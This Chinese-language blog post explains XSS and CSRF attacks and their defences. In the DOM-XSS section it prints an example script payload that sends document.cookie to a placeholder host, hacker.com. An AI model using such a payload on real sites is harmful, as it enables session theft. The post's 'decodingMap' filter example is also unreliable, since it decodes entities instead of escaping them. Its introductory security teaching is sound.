---
title: 安全：XSS和CSRF
date: 2018-08-16 14:34:13
tags:
---
初次理解XSS和CSRF攻击
<!-- more -->
### XSS
全称 Cross Site Script 跨站脚本攻击，原本缩写为CSS，但为了区别于层叠样式表，在安全领域称为XSS。

XSS攻击是指攻击者在网站上注入恶意的客户端代码，通过恶意脚本对客户端网页进行篡改，从而在用户浏览网页时，对用户浏览器进行控制或者获取用户隐私数据的一种攻击方式。

有多种方式进行XSS攻击，但它们的共同点是：将一些隐私数据像cookie、session发送给攻击者，将受害者重定向到一个由攻击者控制的网站，在受害者使用的机器上进行一些恶意操作

常见的基于DOM的XSS攻击是指通过恶意脚本修改页面DOM结构，是纯粹发生在客户端的攻击，eg：
```
div.innerHTML = userComment

// userComment 内容是 <script>$.get('http://hacker.com?cookie=' + document.cookie)</script>
```
此时恶意就被执行了

### XSS防范
1、HttpOnly 这个属性可以防止XSS，它会禁止javascript脚本来访问cookie。

前面说道攻击者可以通过注入恶意脚本获取用户的cookie信息，通常cookie中都包含了用户的登录凭证信息，攻击者在获取到cookie之后，就可以发起cookie劫持攻击。所以严格来说HttpOnly并非阻止XSS攻击，而是阻止XSS攻击后的cookie劫持

2、不要使用innerHTML，改成innerText，此时script标签里的内容就会被当成文本，不执行。

如果一定要用innerHTML，使用字符过滤（XSS filter），在前端框架中一般都会有一份decodingMap，用于对用户输入的包含特殊字符进行过滤
```
const decodingMap = {
    '&lt;': '<',
    '&gt;': '>',
    '&quot;': '"',
    '&amp;': '&',
}
```

### CSRF
全称：Cross Site Request Forgery 即跨站请求伪造，是一种劫持受信任用户像服务器发送非预期请求的攻击方式

通常情况下，CSRF攻击是攻击者借助受害者的cookie骗取服务器信任，可以在受害者不知情的情况下以受害者名义伪造请求发送给受攻击的服务器，从而在并未授权的情况下执行在权限保护之下的操作

eg：

- 用户在 qq.com 登陆
- 用户切换到 hacker.com （恶意网站）
- hacker.com 发送一个 qq.com/add-friend 的请求，让用户添加hacker为好友
- 用户在不知情的情况下添加了hacker为好友
- 用户本身没有想发送这个请求，但hacker伪造了用户发请求的假象

由于 cookie 中包含了用户的认证信息，当用户访问攻击者准备的攻击环境时，攻击者就可以对服务器发起CSRF攻击。在攻击过程中，攻击者借助受害者的cookie骗取服务器信任，但并不能拿到cookie，也看不到cookie的内容，对于服务器返回的内容，由于同源策略的限制，也无法进行解析。所以，攻击者无法从返回结果中得到任何东西。所能做的就是给服务器发送请求，执行请求中的命令，在服务器直接改变数据的值，而非窃取服务器中的数据。

### CSRF防范
1、验证码
从上面的例子可以看出，CSRF攻击往往是在用户不知情的情况下构造了网络请求，而验证码会强制用户与应用进行交互，才能最终完成并提交请求。

2、Referer Check
根据HTTP协议，在HTTP头部有一个字段叫 Referer ，它记录着HTTP请求的来源地址，通过它可以检查请求是否来自合法的源。因此要防范CSRF攻击，只需验证它的 Referer 值，如果是以相同域名开头的，就是来自网站自己的请求，是合法的，如果是来自其他网站的，可以拒绝该请求

3、添加token验证
CSRF攻击能成功的原因在于攻击者可以伪造用户请求，该请求中所有的用户验证信息都存在于cookie中，要抵御该攻击，关键是要在请求中放入攻击者不能伪造的信息，并且该信息不能存在于cookie中。可以在HTTP请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证 token，从而判断是否是CSRF攻击

更多详细内容：https://mp.weixin.qq.com/s/Rf4dag7Z1rFNl4LxbAjyqw
